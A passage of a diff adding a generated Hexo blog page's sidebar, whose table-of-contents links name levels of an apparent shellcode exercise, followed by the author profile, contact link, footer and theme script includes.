class="nav-text">level 4  不含 (0x48)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link"><span class="nav-text"></span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level-5-6-%E9%99%90%E5%88%B6syscall"><span class="nav-text">level 5 6 限制syscall</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level-7-%E9%99%90%E5%88%B6stdin-stdout"><span class="nav-text">level 7 限制stdin stdout</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#-1"><span class="nav-text"></span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level-8-%E9%99%90%E5%88%B6%E5%AD%97%E8%8A%82%E6%95%B0%E6%9C%80%E5%A4%A70x12"><span class="nav-text">level 8 限制字节数最大0x12</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level-13-%E9%99%90%E5%88%B6%E5%AD%97%E8%8A%82%E6%95%B0%E6%9C%80%E5%A4%A70xc"><span class="nav-text">level 13 限制字节数最大0xc</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level-9-%E8%B7%B3%E8%BF%87"><span class="nav-text">level 9 跳过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level-12-%E6%AF%8F%E4%B8%AA%E5%AD%97%E8%8A%82%E4%B8%8D%E7%9B%B8%E5%90%8C"><span class="nav-text">level 12 每个字节不相同</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#level-14-%E9%99%90%E5%88%B66%E4%B8%AA%E5%AD%97%E8%8A%82"><span class="nav-text">level 14 限制6个字节</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="dreamfoil"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">dreamfoil</p>
+  <div class="site-description" itemprop="description">独立之精神，自由之思想。</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">16</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">8</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="mailto:1224825643@qq.com" title="E-Mail → mailto:1224825643@qq.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">dreamfoil</span>
+</div>
+
+ <!--
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div> -->
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
